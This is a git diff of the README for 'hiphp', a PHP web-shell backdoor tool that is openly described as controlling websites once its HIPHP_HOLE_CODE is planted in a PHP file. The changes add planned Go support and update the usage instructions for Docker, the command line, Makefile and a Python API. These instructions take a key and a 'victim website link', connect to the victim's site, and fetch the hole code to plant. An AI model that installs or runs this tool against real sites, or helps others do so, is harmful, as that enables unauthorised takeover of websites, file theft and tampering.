@@ -37,6 +37,9 @@
 <br>
 <h2>What is Hiphp?</h2>
 <p>The BackDoor of HIPHP allows you to control the websites that are based on PHP using HTTP/HTTPS protocol. It works by sending files, tokens, and commands to the site using port 80's POST/GET method. After placing the <a href="#HIPHP_HOLE_CODE-Example">HIPHP_HOLE_CODE</a> into any PHP file, it will allow you to access it and perform various activities such as downloading and editing files. It also allows you to connect to tor networks, this BackDoor is a password protected.</p>
+<br>
+<h3>What's new in the version 0.3.0?</h3>
+<p>hiphp will be able to control websites based on golang (GO).</p>
 
 
 <br>
@@ -157,10 +160,15 @@
 ❯ docker build -t hiphp:latest .
 
 # Run as CLI:
-❯ docker run -e KEY="<KEY>" -e URL="<URL>" -i -t hiphp:latest
+❯ docker run -e KEY="<KEY*>" -e URL="<URL*>" -e LANGU="<LANG>" -i -t hiphp:latest
 
 # Run as GUI:
 ❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t hiphp:latest
+
+# *     = All inputs must be entered.
+# KEY   = The password used for encrypt HIPHP_HOLE_CODE.
+# URL   = Victim website link.
+# LANG  = based site language, default LANG='php'.
 ```
 
 <p>click to see <a href="https://asciinema.org/a/QRlMY6JH9uwMCIbaV7F6lLoQ1">Demo</a></p><br>
@@ -176,10 +184,15 @@
 ❯ docker build -t docker.io/yasserbdj96/hiphp:latest .
 
 # Run as CLI:
-❯ docker run -e KEY="<KEY>" -e URL="<URL>" -i -t docker.io/yasserbdj96/hiphp:latest
+❯ docker run -e KEY="<KEY*>" -e URL="<URL*>" -e LANGU="<LANG>" -i -t docker.io/yasserbdj96/hiphp:latest
 
 # Run as GUI:
 ❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t docker.io/yasserbdj96/hiphp:latest
+
+# *     = All inputs must be entered.
+# KEY   = The password used for encrypt HIPHP_HOLE_CODE.
+# URL   = Victim website link.
+# LANG  = based site language, default LANG='php'.
 ```
 
 <p>click to see <a href="https://asciinema.org/a/HAzDifB2g81KJ8CBhil8K0mzC">Demo</a></p><br>
@@ -194,10 +207,15 @@
 ❯ docker build -t ghcr.io/yasserbdj96/hiphp:latest .
 
 # Run as CLI:
-❯ docker run -e KEY="<KEY>" -e URL="<URL>" -i -t ghcr.io/yasserbdj96/hiphp:latest
+❯ docker run -e KEY="<KEY*>" -e URL="<URL*>" -e LANGU="<LANG>" -i -t ghcr.io/yasserbdj96/hiphp:latest
 
 # Run as GUI:
 ❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t ghcr.io/yasserbdj96/hiphp:latest
+
+# *     = All inputs must be entered.
+# KEY   = The password used for encrypt HIPHP_HOLE_CODE.
+# URL   = Victim website link.
+# LANG  = based site language, default LANG='php'.
 ```
 
 <p>click to see <a href="https://asciinema.org/a/wDWAVo5GURsAbCUVseZsN2PdY">Demo</a></p><br>
@@ -242,14 +260,19 @@
 # Update:
 ❯ bash install.sh -up
 
-# Usage:
-#      hiphp [OPTION]
-#      hiphp --help                --> hiphp cli help.
-#      hiphp --geth [KEY] [URL]    --> Get the HIPHP_HOLE_CODE Encrypted by your [KEY].
-#      hiphp [KEY] [URL]           --> Connect to the victim's website (CLI) Mode.
-#      hiphp --tk                  --> Run hiphp with 'hiphp-tk' (GUI) Mode.
-#      hiphp --dst                 --> Run hiphp with 'hiphp-desktop' (GUI) Mode.
-#      hiphp --version             --> Get the version number you are working with.
+#Usage: hiphp [OPTION]
+
+# hiphp --help                      = hiphp cli help.
+# hiphp --geth [KEY*] [URL*] [LANG] = Get the HIPHP_HOLE_CODE Encrypted by your [KEY] & based site language [LANG].
+# hiphp [KEY*] [URL*] [LANG]        = Connect to the victim's website (CLI) Mode.
+# hiphp --tk                        = Run hiphp with 'hiphp-tk' (GUI) Mode.
+# hiphp --dst                       = Run hiphp with 'hiphp-desktop' (GUI) Mode.
+# hiphp --version                   = Get the version number you are working with.
+
+# *     = All inputs must be entered.
+# KEY   = The password used for encrypt HIPHP_HOLE_CODE.
+# URL   = Victim website link.
+# LANG  = based site language, default LANG='php'.
 
 # Uninstall:
 ❯ bash install.sh -u
@@ -271,12 +294,17 @@
 # Update:
 ❯ bash install.sh -tup
 
-# Usage:
-#      hiphp [OPTION]
-#      hiphp --help                --> hiphp cli help.
-#      hiphp --geth [KEY] [URL]    --> Get the HIPHP_HOLE_CODE Encrypted by your [KEY].
-#      hiphp [KEY] [URL]           --> Connect to the victim's website (CLI) Mode.
-#      hiphp --version             --> Get the version number you are working with.
+#Usage: hiphp [OPTION]
+
+# hiphp --help                      = hiphp cli help.
+# hiphp --geth [KEY*] [URL*] [LANG] = Get the HIPHP_HOLE_CODE Encrypted by your [KEY] & based site language [LANG].
+# hiphp [KEY*] [URL*] [LANG]        = Connect to the victim's website (CLI) Mode.
+# hiphp --version                   = Get the version number you are working with.
+
+# *     = All inputs must be entered.
+# KEY   = The password used for encrypt HIPHP_HOLE_CODE.
+# URL   = Victim website link.
+# LANG  = based site language, default LANG='php'.
 
 # Uninstall:
 ❯ bash install.sh -tu
@@ -301,16 +329,21 @@
 ❯ install_all_requirements_win.bat #for windows os.
 
 # default run on any os:
-❯ python3 run.py <KEY> <URL>
+❯ python3 run.py <KEY*> <URL*> <LANG>
 
 # Run with Makefile:
-❯ make run arg="cli" url="<URL>" key="<KEY>"
+❯ make run arg="cli" url="<URL*>" key="<KEY*>" lang="<LANG>"
 
 # For Windows:
 # Do not forget to modify the "config.ini" file or use the following command:
 # > python -c "import sys; open('config.ini','w+').write('python_default_path='+sys.executable)"
 # OR Run 'configure-config-file-for-windows.py'.
-❯ run.bat <KEY> <URL>
+❯ run.bat <KEY*> <URL*> <LANG>
+
+# *     = All inputs must be entered.
+# KEY   = The password used for encrypt HIPHP_HOLE_CODE.
+# URL   = Victim website link.
+# LANG  = based site language, default LANG='php'.
 
 ```
 
@@ -422,7 +455,7 @@ hiphp Commands :
 ❯ python3 main.py
 
 # Run with Makefile:
-❯ make run arg="dst" url="<URL>" key="<KEY>"
+❯ make run arg="dst"
 
 # For Linux:
 ❯ bash run-hiphp-desktop.sh
@@ -459,6 +492,8 @@ hiphp Commands :
 
 # Run with Makefile:
 ❯ make run arg="tk" url="<URL>" key="<KEY>"
+# OR
+❯ make run arg="tk"
 
 # For Linux:
 ❯ bash run-hiphp-tk.sh
@@ -479,7 +514,13 @@ hiphp Commands :
 from hiphp import *
 
 # Connect:
-p1=hiphp(key="<KEY>",url="<URL>")
+p1=hiphp(key="<KEY*>",url="<URL*>",lang="<LANG>",retu=<RETURN>)# Default: retu=False
+
+# *      = All inputs must be entered.
+# KEY    = The password used for encrypt HIPHP_HOLE_CODE.
+# URL    = Victim website link.
+# LANG   = based site language, default LANG='php'.
+# RETURN = True for return data as a string, false for print data in the console.
 ```
 
 <h4>Script Examples:</h4>
@@ -489,9 +530,9 @@ p1=hiphp(key="<KEY>",url="<URL>")
 from hiphp import *
 
 # Connect:
-p1=hiphp(key="123",url="http://127.0.0.1/index.php")#Default: retu=False.
-#p1=hiphp(key="123",url="http://kfdjlkgjflkgjdfkjgkfdjgkjdfkgjk.onion/index.php")
-#p1=hiphp(key="123",url="https://google.com/index.php")
+p1=hiphp(key="123456789",url="http://127.0.0.1/index.php")#Default: retu=False.
+#p1=hiphp(key="123456789",url="http://kfdjlkgjflkgjdfkjgkfdjgkjdfkgjk.onion/index.php")
+#p1=hiphp(key="123456789",url="https://google.com/index.php")
 
 # Get the hole Code:
 p1.get_hole()# Copy this code into the file whose path you entered earlier. ex: https://localhost/index.php
